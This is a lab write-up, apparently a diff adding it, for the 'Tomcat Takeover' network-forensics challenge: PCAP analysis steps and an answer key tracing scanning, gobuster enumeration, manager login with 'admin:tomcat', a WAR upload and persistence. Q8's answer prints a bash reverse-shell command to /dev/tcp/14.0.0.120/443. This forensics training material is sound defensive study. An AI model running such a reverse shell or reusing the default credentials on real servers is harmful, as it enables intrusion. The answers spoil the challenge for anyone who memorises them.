@@ -1,0 +1,110 @@
+lab write-up:Tomcat Takeover
+
+## Scenario:
+The SOC team has identified suspicious activity on a web server within the company's intranet. 
+To better understand the situation, they have captured network traffic for analysis.
+ The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server.
+ Your task is to analyze the PCAP file to understand the scope of the attack.
+
+#Category:
+Network Forensics.
+
+#Tactics:
+Reconnaissance , Execution , Persistence , Privilege Escalation , Credential Access , Discovery , Command and Control.
+
+#Tools:
+Wireshark , NetworkMiner.
+
+
+## Analysis Steps:
+  
+
+1- Open the PCAP File
+
+Load the PCAP file in Wireshark for traffic analysis.
+
+Filter HTTP Traffic
+
+Since Tomcat uses web interfaces, apply the filter:
+
+http
+
+2- Look for Tomcat Manager Access
+
+Search for requests related to the Tomcat admin panel such as:
+
+/manager/html
+/manager/text
+
+3- Identify Suspicious Login Attempts
+
+Inspect HTTP requests for Basic Authentication headers that may contain login credentials.
+
+Check for File Upload or Command Execution
+
+Attackers may upload malicious WAR files to gain remote access.
+
+4- Look for HTTP POST requests related to uploads.
+
+Analyze Source and Destination IPs
+
+Identify the attacker IP accessing the Tomcat server and the compromised host.
+
+5- Extract Files Using NetworkMiner
+
+Open the PCAP in NetworkMiner and check the Files tab for extracted files such as uploaded WAR files.
+
+Look for Command and Control Activity
+
+After compromise, analyze traffic for suspicious outbound connections from the server.
+
+6- Document Indicators of Compromise (IOCs)
+
+Attacker IP address
+
+Compromised server IP
+
+Suspicious URLs
+
+Extracted files (e.g., WAR files)
+
+
+
+## Questions & Answers:
+Q1:Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports,
+ indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?
+Answer:14.0.0.120
+
+Q2:Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?
+Answer:China
+
+Q3:From the PCAP file, multiple open ports were detected as a result of the attacker's active scan.
+Which of these ports provides access to the web server admin panel?
+Answer:8080
+
+Q4:Following the discovery of open ports on our server, it appears that the attacker attempted to
+enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis
+that assisted the attacker in this enumeration process?
+Answer:gobuster
+
+Q5:After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces.
+Which specific directory related to the admin panel did the attacker uncover?
+Answer:/manager
+
+Q6:After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct
+ username and password that the attacker successfully used for login?
+Answer:admin:tomcat
+
+Q7:Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell.
+Can you identify the name of this malicious file from the captured data?
+Answer:JXQOZY.war
+
+Q8:After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised
+machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?
+Answer:/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
+
+
+#Lessons Learned:
+
+Attackers can exploit Apache Tomcat manager interfaces to gain unauthorized access and upload malicious files to the server.
+Monitoring HTTP traffic and restricting access to administrative panels can help detect and prevent web server compromise.
